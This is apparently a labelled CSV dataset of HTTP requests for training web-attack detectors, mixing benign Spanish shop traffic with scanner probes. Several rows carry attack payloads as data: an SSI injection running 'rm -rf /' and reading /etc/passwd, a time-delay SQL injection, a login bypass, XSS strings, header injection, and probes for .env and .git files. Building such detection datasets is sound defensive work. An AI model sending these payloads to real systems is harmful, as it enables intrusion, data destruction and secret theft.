text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=tropeano3&password=86a7o&nombre=Alimena&apellidos=Santidrian+Rexach&email=musson%40ajuntamentdebarcelona20.pr&dni=12186635Q&direccion=Castilla+S%2FN+&ciudad=Legarda&cp=33875&provincia=Toledo&ntc=5536600969659944&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=09AD3403D7C0E12391236964E6DFEC50 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=tropeano3&password=86a7o&nombre=Alimena&apellidos=Santidrian+Rexach&email=musson%40ajuntamentdebarcelona20.pr&dni=12186635Q&direccion=Castilla+S%2FN+&ciudad=Legarda&cp=33875&provincia=Toledo&ntc=5536600969659944&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=17ED2223638BB45BEC82AF85730F0BF3 localhost:8080  ,GET,/tienda1/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /storage/app/private/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/storage/app/private/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/vaciar.jsp [SEP]  B2=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=5AB0A76F58536DFFAB748AF5D70577A1 localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=Vino+Rioja&precio=100&cantidad=20&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6CFA0F40C592DD85088189709110A17F localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=100&cantidad=20&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
"GET /api/v2/ [SEP]   [SEP] Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 BitSightBot/1.0 [SEP]     ",GET,/api/v2/,,,"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 BitSightBot/1.0",404,1,scanning,loki_exp1
GET /tienda1/imagenes/3.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5B10B624400FAB7E2407B1C3AB384531 localhost:8080  ,GET,/tienda1/imagenes/3.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/6909030637832563290.jsp.Bak [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7614F12E687DBDEC2F84220A2E441B85 localhost:8080  ,GET,/tienda1/publico/6909030637832563290.jsp.Bak,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5BFCD1FBFE832925E65705744894E914 localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=nagaraja&password=6E0turEr2&nombre=Nuri&apellidos=Bada+Gorina&email=copley%40pisossantcugat.bf&dni=35871689S&direccion=Pelayo%2C+11+12%3FD&ciudad=Pozaldez&cp=45571&provincia=La+Rioja&ntc=4535011157826668&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=50BC3B22D3AE5DFB17198F22FB86835F localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=nagaraja&password=6E0turEr2&nombre=Nuri&apellidos=Bada+Gorina&email=copley%40pisossantcugat.bf&dni=35871689S&direccion=Pelayo%2C+11+12%3FD&ciudad=Pozaldez&cp=45571&provincia=La+Rioja&ntc=4535011157826668&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsg=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=CE714B13F8A939CCE9D2CBB6ADE28076 localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsg=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsg=Credenciales+incorrectas [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=369CC181D7218CE14DA35F9C375C2ACC localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsg=Credenciales+incorrectas,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=norberto&pwd=comparendo&remember=off&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=A2D34875638783D56B58648AFC6BBD91 localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=norberto&pwd=comparendo&remember=off&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=charness4&password=453a%F1eg6&nombre=Prisciano&apellidos=Villalon+Castanyer&email=caragiu%40blogsmegumi.de&dni=20808666Z&direccion=Calle+Fernando+H.+Guzman%2C+88+12%3FG&ciudad=Vilanova+de+la+Ba%3Frca&cp=08619&provincia=Tarragona&ntc=0673547824413217&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=9B02FB79C2CCB29D04ACD05730B60AF6 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=charness4&password=453a%F1eg6&nombre=Prisciano&apellidos=Villalon+Castanyer&email=caragiu%40blogsmegumi.de&dni=20808666Z&direccion=Calle+Fernando+H.+Guzman%2C+88+12%3FG&ciudad=Vilanova+de+la+Ba%3Frca&cp=08619&provincia=Tarragona&ntc=0673547824413217&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /mailer/crm/phpinfo.php [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/mailer/crm/phpinfo.php,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /wiki [SEP]   [SEP] Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) [SEP]     ,GET,/wiki,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),404,1,scanning,loki_exp1
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=486698C8BD8D4552672DFA54000F0E41 localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/fotos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=A49101C73A8085023A15626BB9F8C45E localhost:8080  ,GET,/tienda1/miembros/fotos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  idA=2 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=95A67261E92F34B83F07DC9F5430D81D localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,idA=2,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=jocelyn&passwordA=v821ri8&nombre=Raven&apellidos=Rambla+Jalencas&email=bourdette%40sexl.ro&dni=66518253E&direccion=C%2F+Fuerte+Isabel+Ii%2C+78+3%3FC&ciudad=Sando&cp=50088&provincia=Girona&ntc=0028019013829640&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=129A0D47A6243D34940100B0440CD13F localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=jocelyn&passwordA=v821ri8&nombre=Raven&apellidos=Rambla+Jalencas&email=bourdette%40sexl.ro&dni=66518253E&direccion=C%2F+Fuerte+Isabel+Ii%2C+78+3%3FC&ciudad=Sando&cp=50088&provincia=Girona&ntc=0028019013829640&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=1&nombre=Vino+Rioja&precio=39&cantidad=84&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=9C14223BC0D5304A37292429A82840D3 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=39&cantidad=84&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=18AE78D9585660AECBC89B967F31F3EF localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] idA=2  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=FE45B548E3B1268F33934AFEDA8C8104 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,idA=2,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=rudich&password=gilito&nombre=Manlio&apellidos=Piedra+Obrador&email=errol%40dise%F1odesoftware.ml&dni=03770036Z&direccion=Llobregat+130%2C+&ciudad=Pe%F1arroya-Pueblonuevo&cp=37130&provincia=Barcelona&ntc=8515880791800894&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C41EA3FE7BD0627188BB6EB4432CFA2A localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=rudich&password=gilito&nombre=Manlio&apellidos=Piedra+Obrador&email=errol%40dise%F1odesoftware.ml&dni=03770036Z&direccion=Llobregat+130%2C+&ciudad=Pe%F1arroya-Pueblonuevo&cp=37130&provincia=Barcelona&ntc=8515880791800894&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
"CONNECT / [SEP]   [SEP] Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Electron/2.0.18 Safari/537.36 [SEP]     ",CONNECT,/,,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Electron/2.0.18 Safari/537.36",404,1,scanning,loki_exp1
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=Credenciales+incorrectas  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=102999A504269EEE64E11D3C327398A9 localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /vendor/.git/config [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/vendor/.git/config,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=72F8951FBE18E4902E9211B9F0289BE5 localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  id=2%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=C2693D6CB3192B6FA53EA29BEE990439 localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,id=2%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=yudin&password=m6l2%E15eo&nombre=Solano&apellidos=Irizar+Morata&email=kimbrell%40erasmusrooms.cu&dni=08490721H&direccion=Barriada+De+La+Virgen+Del+Valle%2C+178+2-F&ciudad=Almohar%EDn&cp=46593&provincia=Toledo&ntc=6652639660879846&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7BD6B7DC1BFA48F8118364554B6F230F localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=yudin&password=m6l2%E15eo&nombre=Solano&apellidos=Irizar+Morata&email=kimbrell%40erasmusrooms.cu&dni=08490721H&direccion=Barriada+De+La+Virgen+Del+Valle%2C+178+2-F&ciudad=Almohar%EDn&cp=46593&provincia=Toledo&ntc=6652639660879846&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7089D0233C8D6F456D9309EADB5EEE80 localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=09086E687C7D79D1FC20BDCA310D045C localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=1any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=296C840EF0DCFF86F302FEC3D14A098B localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=1any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=breanne&password=galce&nombre=Medey&apellidos=Adam+Calao&email=koock%40aridossanchez.mt&dni=78590398L&direccion=C%2F+Virgen+De+Bego%F1a+43+&ciudad=Pontenova%2C+A&cp=26292&provincia=Burgos&ntc=3428501234979373&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=1F7ABBF2400150323410B47BB32F3AA9 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=breanne&password=galce&nombre=Medey&apellidos=Adam+Calao&email=koock%40aridossanchez.mt&dni=78590398L&direccion=C%2F+Virgen+De+Bego%F1a+43+&ciudad=Pontenova%2C+A&cp=26292&provincia=Burgos&ntc=3428501234979373&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=2  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E3601ACCFF8F2133D348682C2A28FB91 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=2,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/imagenes/castro.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=CADDB4A6B7EE119EF7A53D8B287FA7E8 localhost:8080  ,GET,/tienda1/miembros/imagenes/castro.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/anadir.jsp [SEP]  id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=E4DB1BAC8E75EE01C8C6E341A0BA8260 localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/imagenes/zarauz.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=9506511CD64D41A282E2087F88C97CC0 localhost:8080  ,GET,/tienda1/miembros/imagenes/zarauz.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=39&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=712907344400ABBFC583B93B73438AB0 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=39&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /storage/.env.bak [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/storage/.env.bak,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Pasar+por+caja  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D29AA1794C720F41F57F4A3308F18099 localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Pasar+por+caja,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET ///s3/.env.bak [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,///s3/.env.bak,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/anadir.jsp [SEP]  id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=88&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=2C162816A79FE85E65542204B4B678F1 localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=88&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /apis/.env.local [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/apis/.env.local,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E0CC740D803CD4D88C59CCF1CC7B1D2C localhost:8080  ,GET,/tienda1/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/3.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=0FA19C2420783613C16E2289503261D0 localhost:8080  ,GET,/tienda1/imagenes/3.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/3.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=34FAE83A6BD72F24EC2F3640BDD1BFAF localhost:8080  ,GET,/tienda1/imagenes/3.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C25EB5B45A80BA531B692B187D9906F1 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=delorme&password=terr%EDgena&nombre=Vladimir&apellidos=Basora+Bargall%F3&email=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&dni=40888726Q&direccion=Rio+Deva%2C+127%2C+13H&ciudad=Avinyonet+de+Puigvent%F3s&cp=25151&provincia=Salamanca&ntc=4881663630598066&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
GET /tienda1/publico/vaciar.jsp [SEP] B2A=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=87B54790EBAEA98811A26EAB55CB404D localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar%27OR%27a%3D%27a&login=swen&pwd=incisorio&remember=off&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D9C7588A11F95A91EAD51953E06EDAA1 localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar%27OR%27a%3D%27a&login=swen&pwd=incisorio&remember=off&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C37C066AF48EE6D5418949C88A5AD5CC localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
